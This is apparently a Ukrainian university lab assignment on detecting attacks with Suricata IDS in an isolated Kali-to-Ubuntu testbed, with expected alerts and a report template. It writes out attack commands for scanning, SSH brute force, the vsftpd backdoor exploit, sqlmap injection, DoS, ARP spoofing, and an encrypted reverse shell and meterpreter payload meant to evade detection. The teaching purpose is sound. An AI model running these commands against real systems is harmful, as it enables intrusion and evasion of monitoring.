# Лаб: Детекція атак у Suricata (Kali → Ubuntu 24 LTS)

*14 жовтня 2026*

## 1. Мета та стенд

Мета — у контрольованому середовищі провести 7 типових атак з Kali Linux на Ubuntu 24.04 LTS, зафіксувати їх детекцію через Suricata (IDS-режим), а потім продемонструвати атаку, яку сигнатурний Suricata **не** побачить — щоб на практиці показати, що IDS/IPS є лише одним шаром захисту, а не самодостатнім рішенням.

**Схема стенду**

| Роль | ОС | IP (приклад) | Призначення |
| --- | --- | --- | --- |
| Атакуючий | Kali Linux (остання) | 192.168.56.10 | Nmap, Hydra, Metasploit, sqlmap, gobuster, hping3, Bettercap |
| Ціль + сенсор | Ubuntu 24.04 LTS | 192.168.56.20 | Suricata в IDS-режимі, вразливі сервіси (SSH, FTP, веб) |

Обидві машини — у віртуалізаторі (VirtualBox/VMware) на окремій Host-only або Internal мережі (ізольовано від продакшн-мережі та інтернету, за винятком завантаження пакетів).

**Попередні умови**

- Базові знання Linux CLI, TCP/IP, HTTP.
- Встановлені Kali Linux та Ubuntu 24.04 LTS з мережевим зв'язком між собою (`ping` працює в обидва боки).
- На Ubuntu для частини атак розгорнуто навмисно вразливі сервіси: застарілий vsftpd 2.3.4 (для демонстрації експлуатації) та тестовий вебзастосунок з SQLi (наприклад, DVWA або bWAPP у Docker).
- **Застереження:** усі дії виконуються виключно у власній ізольованій лабораторії. Сканування та атаки на чужі системи без письмового дозволу — незаконні.

## 2. Встановлення та налаштування Suricata на Ubuntu 24.04 LTS

```bash
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt update
sudo apt install -y suricata jq

# Визначити інтерфейс цілі (напр. eth0 / enp0s3)
ip a

# Прописати інтерфейс і HOME_NET у конфігу
sudo nano /etc/suricata/suricata.yaml
# af-packet: interface: enp0s3
# vars.address-groups.HOME_NET: "[192.168.56.20]"

# Оновити набір правил Emerging Threats Open
sudo suricata-update
sudo suricata-update list-sources

*** Можливо знадобиться:
sudo suricata-update update-sources

# Перевірити конфіг
sudo suricata -T -c /etc/suricata/suricata.yaml -v

# Запустити в IDS-режимі (pcap/af-packet, лог у /var/log/suricata/)
sudo systemctl enable --now suricata
sudo systemctl status suricata
```

**Моніторинг алертів у реальному часі:**

```bash
sudo tail -f /var/log/suricata/fast.log
# або структуровано через eve.json
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
```

У лабораторії Suricata працює в **IDS-режимі** (пасивне прослуховування через af-packet) — це достатньо для демонстрації детекції. За бажання режим IPS (inline, NFQUEUE) можна показати окремо як розширення завдання.

## 3. Атака 1 — Розвідка: Nmap сканування

**Kali (атакуючий):**

```bash
# SYN-скан портів + визначення ОС і версій сервісів
nmap -sS -sV -O -T4 192.168.56.20

# Агресивне сканування з NSE-скриптами (виразніший трафік → легше детектується)
nmap -sS -A -T4 -p- 192.168.56.20
```

**Детекція в Suricata:** вбудовані правила ET Open категорії `scan` реагують на характерний патерн SYN-пакетів без завершення хендшейку та на сигнатури NSE-скриптів.

```
[**] [1:2009582:5] ET SCAN Potential SSH Scan [**]
[**] [1:2001219:20] ET SCAN Nmap Scripting Engine User-Agent Detected [**]
[**] [1:2009400:6] ET SCAN Possible Nmap User-Agent Observed [**]
```

**Висновок:** звичайний `nmap -sS` часто проходить майже непомітно (поодинокі SYN-пакети не завжди тригерять сигнатури), але `-A`/`-sV`/`--script` додають виразні артефакти (User-Agent, банер-граббінг), які ET Open ловить стабільно. Це перша ілюстрація: швидкість і «шумність» атаки прямо впливають на виявлюваність.

## 4. Атака 2 — Брутфорс SSH (Hydra)

**Kali:**

```bash
hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20 -t 4
```

**Детекція в Suricata:** ET Open містить поведінкову сигнатуру на кількість спроб SSH-з'єднання за короткий проміжок часу з однієї IP (threshold-правило).

```
[**] [1:2001219:20] ET SCAN Potential SSH Scan [**]
[**] [1:2008438:7] ET POLICY Suspicious inbound to SSH port 22 [**]
```

Додатково варто написати власне просте кастомне правило (local.rules) для точнішого порогу:

```
alert tcp any any -> $HOME_NET 22 (msg:"CUSTOM SSH Bruteforce Attempt"; flow:to_server; flags:S; threshold:type both, track by_src, count 10, seconds 30; classtype:attempted-recon; sid:1000001; rev:1;)
```

**Висновок:** брутфорс — класичний приклад threshold/rate-based детекції: Suricata не аналізує сам пароль (трафік зашифрований SSH), а виявляє аномальну *частоту* з'єднань. Це ключова відмінність від сигнатур на основі вмісту пакета.

## 5. Атака 3 — Експлуатація вразливості (vsftpd 2.3.4 backdoor)

На Ubuntu попередньо встановлюється навмисно вразлива версія `vsftpd 2.3.4` (відома backdoor-вразливість, CVE‑2011‑2523).

### Встановлення вразливого vsftpd 2.3.4

В офіційних репозиторіях Ubuntu 24.04 LTS цієї застарілої версії вже немає — її ставлять окремо, в ізольованому середовищі:

```bash
# Варіант 1: архівний .deb-пакет (Ubuntu 12.04/14.04 build)
wget http://archive.ubuntu.com/ubuntu/pool/main/v/vsftpd/vsftpd_2.3.4-1ubuntu1_amd64.deb
sudo dpkg -i vsftpd_2.3.4-1ubuntu1_amd64.deb || sudo apt -f install -y

# Варіант 2: збірка з джерел, якщо архівного пакета немає
sudo apt install -y build-essential libssl-dev
wget https://security.appspot.com/downloads/vsftpd-2.3.4.tar.gz
tar xzf vsftpd-2.3.4.tar.gz && cd vsftpd-2.3.4
make
sudo cp vsftpd /usr/local/sbin/vsftpd-234

# Запуск на стандартному 21 порту
sudo /usr/local/sbin/vsftpd-234 /etc/vsftpd.conf &

# Перевірка, що сервіс слухає порт 21
sudo ss -tlnp | grep ':21'
```

> Якщо компіляція з джерел ускладнена відсутністю застарілих залежностей — простіша альтернатива: розгорнути готовий образ **Metasploitable 2**, де vsftpd 2.3.4 вже встановлено й налаштовано.

**Kali (Metasploit):**

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.20
run
```

**Детекція в Suricata:** сигнатура ET Open реагує на характерний «смайлик»-тригер у USER-команді (`:)`), який активує backdoor на порту 6200/tcp.

```
[**] [1:2008983:3] ET EXPLOIT VSFTPD Backdoor User Login Smiley [**]
[**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**]
```

**Висновок:** це приклад класичної сигнатурної детекції на основі *вмісту пакета* (pattern matching на відомий payload). Такі правила ефективні лише проти вже відомих, задокументованих експлойтів — будь-яка модифікація payload (навіть зміна символу) може обійти правило, якщо воно написане занадто вузько.

## 6. Атака 4 — SQL injection (sqlmap)

На Ubuntu розгорнуто тестовий вразливий вебзастосунок (DVWA/bWAPP) на порту 80.

### Встановлення DVWA/bWAPP у Docker

```bash
sudo apt install -y docker.io docker-compose
sudo systemctl enable --now docker

# DVWA (офіційний образ)
sudo docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa

# Перевірка, що контейнер піднявся
curl -I http://localhost
```

Після першого запуску відкрити в браузері `http://192.168.56.20/setup.php` і натиснути **Create / Reset Database**. У розділі **DVWA Security** виставити рівень **low** для стабільного відтворення SQLi без додаткового захисту.

**Альтернатива — bWAPP:**

```bash
sudo docker run -d -p 80:80 --name bwapp raesene/bwapp
```

Після старту відкрити `http://192.168.56.20/install.php` для ініціалізації бази даних.

**Kali:**

```bash
sqlmap -u "http://192.168.56.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=...; security=low" \
  --batch --dbs

sqlmap -u "http://192.168.56.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=...; security=low" \
  --batch -D dvwa -T users --dump
```

**Детекція в Suricata:** ET Open категорія `web_specific_apps` / `attack_response` реагує на типові SQLi-патерни в HTTP-запиті (`UNION SELECT`, `' OR '1'='1`, коментарі `--`, функції `SLEEP()` при time-based інʼєкціях).

```
[**] [1:2006445:11] ET WEB_SERVER SQL Injection Select Statement [**]
[**] [1:2010936:7] ET WEB_SPECIFIC_APPS SQL Injection - UNION SELECT [**]
```

**Висновок:** sqlmap у режимі `--batch` генерує десятки запитів-зондів, тому алерти з'являються масово — зручна ілюстрація, наскільки «гучний» автоматизований інструмент. Для прихованого тестування атакуючі зазвичай зменшують `--delay`/`--risk`/`--level` або переходять на ручну інʼєкцію — що знижує кількість спрацювань.

## 7. Атака 5 — Веб directory bruteforce (gobuster)

**Kali:**

```bash
gobuster dir -u http://192.168.56.20 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 -x php,html,txt
```

**Детекція в Suricata:** ET Open категорія `web_specific_apps`/`scan` ловить характерний User-Agent gobuster та надвисоку частоту 404/запитів за секунду з однієї IP.

```
[**] [1:2016535:4] ET SCAN Possible Gobuster User-Agent Observed [**]
[**] [1:2024766:2] ET WEB_SERVER Possible Web Crawl - Multiple 404 Responses [**]
```

**Висновок:** так само, як у випадку sqlmap, дефолтний User-Agent інструмента — це "подарунок" для детекції. Проста зміна `-a "Mozilla/5.0 ..."` та зменшення потоків (`-t`) суттєво ускладнює виявлення за цим конкретним індикатором, хоча аномальна частота запитів усе одно залишається помітною.

## 8. Атака 6 — DoS (hping3 SYN flood / Slowloris)

**Kali — SYN flood:**

```bash
sudo hping3 -S -p 80 --flood --rand-source 192.168.56.20
```

**Kali — Slowloris (виснаження з'єднань на прикладному рівні):**

```bash
sudo apt install slowloris -y
slowloris 192.168.56.20 -p 80
```

**Детекція в Suricata:**

```
[**] [1:2001219:20] ET SCAN Potential SSH Scan [**]  # побічний шум
[**] [1:2200003:1] GPL DOS Excessive Number of TCP SYN Packets [**]
[**] [1:2210013:2] ET DOS Possible Slowloris Attack [**]
```

SYN flood також добре видно через threshold-правило за кількістю SYN-пакетів із випадкових/однієї IP за секунду.

**Висновок:** DoS/DDoS — приклад детекції за *обʼємом/патерном трафіку*, а не за вмістом пакета. Suricata в чистому IDS-режимі лише сигналізує — реальне блокування потребує або IPS-режиму (inline + NFQUEUE/drop), або інтеграції з firewall (fail2ban, iptables/nftables) чи rate-limiting на рівні мережі.

## 9. Атака 7 (опційно) — ARP spoofing / MitM (Bettercap)

**Kali:**

```bash
sudo bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.56.20
> arp.spoof on
> net.sniff on
```

**Детекція в Suricata:**

```
[**] [1:2200074:1] GPL ARP_SPOOF detected [**]
[**] [1:2600015:2] ET POLICY ARP Spoofing or Possible ARP Cache Poisoning [**]
```

Suricata бачить аномальні ARP-відповіді (невідповідність MAC/IP, нехарактерну частоту ARP-пакетів) — за умови, що в конфігурації увімкнено декодер ARP/`app-layer` для цього типу трафіку.

**Висновок:** ARP spoofing — атака на канальному рівні (L2), і стандартний набір ET Open щодо неї обмежений; якість детекції сильно залежить від того, чи сенсор взагалі бачить L2-трафік (через SPAN-порт/хаб, а не лише маршрутизований IP-трафік). Це добра ілюстрація того, що розміщення сенсора в мережі критично впливає на його ефективність.

## 10. Бонус — атака, яку Suricata не побачить

**Ідея:** показати, що сигнатурний IDS аналізує відомі патерни у відкритому/передбачуваному трафіку. Якщо трафік зашифрований end-to-end або payload достатньо змінений, щоб не збігатися з жодною сигнатурою, Suricata (без TLS-інспекції чи поведінкової аналітики) не підніме жодного алерту.

**Варіант A — реверс-шелл через TLS-тунель (найпоказовіший):**

```bash
# На Kali: генеруємо самопідписаний сертифікат і слухаємо TLS-з'єднання
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=update.local"
ncat --ssl -lvp 443 --ssl-cert cert.pem --ssl-key key.pem

# На Ubuntu (імітуємо вже скомпрометований хост, що "дзвонить додому"):
ncat --ssl 192.168.56.10 443 -e /bin/bash
```

З точки зору Suricata це виглядає як звичайне вихідне HTTPS-з'єднання на 443 порт — вміст команд всередині TLS-сесії їй недоступний без MITM-розшифрування (SSL/TLS inspection), яке в типовому лабораторному сетапі не налаштоване.

**Варіант B — обфускація payload в Metasploit (encoder + staged payload через HTTPS):**

```bash
msfvenom -p linux/x64/meterpreter/reverse_https LHOST=192.168.56.10 LPORT=443 -f elf -o update.elf
```

`reverse_https`-пейлоад маскує C2-трафік під звичайний HTTPS, через що типові сигнатури на `reverse_tcp`/`meterpreter` не спрацьовують.

**Чому Suricata мовчить:**

- Сигнатурний движок зіставляє байти/патерни з базою правил — немає правила → немає алерту (а зашифрований трафік взагалі унеможливлює зіставлення вмісту).
- Без `TLS inspection` (MITM-проксі з власним CA) Suricata бачить лише метадані TLS-сесії (SNI, JA3-відбиток, сертифікат), але не саму команду.
- Навіть JA3/JA3S-аналітика і аномалії SNI (наприклад, домен `update.local`, якого немає в DNS) — це вже не "з коробки" правило, а додаткове налаштування та аналіз аналітиком, а не автоматичний алерт.

**Головний висновок завдання:** IDS/IPS (навіть з актуальними сигнатурами ET Open) — це лише один шар *Defense in Depth*. Він ефективний проти відомих, "шумних" і незашифрованих атак, але безсилий проти:

- шифрованих C2-каналів без TLS-інспекції,
- кастомних/обфускованих payload без відповідних сигнатур,
- "low and slow" атак, що не перевищують поріг threshold-правил,
- 0-day і атак на канальному рівні поза полем зору сенсора.

Потрібні додаткові шари: TLS-інспекція, EDR/host-based моніторинг, поведінкова аналітика (NTA/NDR, ML-based anomaly detection), сегментація мережі, принцип найменших привілеїв і регулярний threat hunting.

## 11. Шаблон звіту

**Структура фінального звіту:**

1. Титульна сторінка (ПІБ, група, дата, тема) (Можна нік замість ПІБ).
2. Опис стенду (IP-адреси, версії ОС, топологія).
3. Конфігурація Suricata (версія, джерело правил, інтерфейс).
4. Таблиця результатів (нижче) — по одному рядку на атаку.
5. Скриншоти `fast.log`/`eve.json` для кожної задетектованої атаки.
6. Розділ "Бонус": опис недетектованої атаки, аргументація чому вона пройшла непоміченою, скриншот відсутності алертів.
7. Висновки (3–5 речень): що показав експеримент про сильні та слабкі сторони сигнатурного IDS.

**Таблиця результатів:**

| № | Атака | Інструмент / команда | SID / назва алерту Suricata | Задетектовано? | Коментар |
| --- | --- | --- | --- | --- | --- |
| 1 | Nmap-сканування | `nmap -sS -A` | 2009582, 2001219 | Так | Виразні артефакти NSE |
| 2 | Брутфорс SSH | `hydra ssh` | 2008438 + custom sid 1000001 | Так | Поріг з'єднань |
| 3 | vsftpd backdoor | Metasploit `vsftpd_234_backdoor` | 2008983, 2100498 | Так | Сигнатура на ":)" |
| 4 | SQL injection | `sqlmap --batch` | 2006445, 2010936 | Так | Масовий шум запитів |
| 5 | Directory bruteforce | `gobuster dir` | 2016535, 2024766 | Так | User-Agent + 404-патерн |
| 6 | DoS (SYN flood/Slowloris) | `hping3`, `slowloris` | 2200003, 2210013 | Так | Поріг обсягу трафіку |
| 7 | ARP spoofing | `bettercap` | 2200074, 2600015 | Частково | Залежить від L2-видимості |
| 8 (бонус) | Реверс-шелл через TLS | `ncat --ssl` / `msfvenom reverse_https` | — | **Ні** | Трафік зашифрований, немає TLS-інспекції |

Потрібно заповнити стовпці "Задетектовано?" та "Коментар" власними результатами — фактичні SID можуть відрізнятись залежно від версії набору правил ET Open.

## 12. Критерії оцінювання та підсумкові висновки

**Критерії оцінювання (приклад, 100 балів):**

| Критерій | Бали |
| --- | --- |
| Коректне розгортання стенду та Suricata | 15 |
| Виконання і документування 5–7 атак з алертами | 50 |
| Кастомне правило `local.rules` для SSH-брутфорсу | 10 |
| Бонусна недетектована атака + пояснення причини | 15 |
| Якість висновків та оформлення звіту | 10 |

**Підсумкові висновки**

Suricata з актуальними правилами ET Open надійно ловить "гучні", незашифровані та добре задокументовані атаки — сканування, брутфорс, відомі експлойти, автоматизовані веб-атаки. Але експеримент з TLS-тунелем доводить: будь-який шифрований або достатньо обфускований канал обходить сигнатурний аналіз без додаткової TLS-інспекції чи поведінкової аналітики. Тому в реальному SOC Suricata/будь-який IDS/IPS розглядається як **один з шарів** Defense in Depth, а не як самодостатній захист — його обов'язково доповнюють EDR на хостах, сегментацією мережі, журналюванням і кореляцією подій (SIEM), а також регулярним proactive threat hunting.
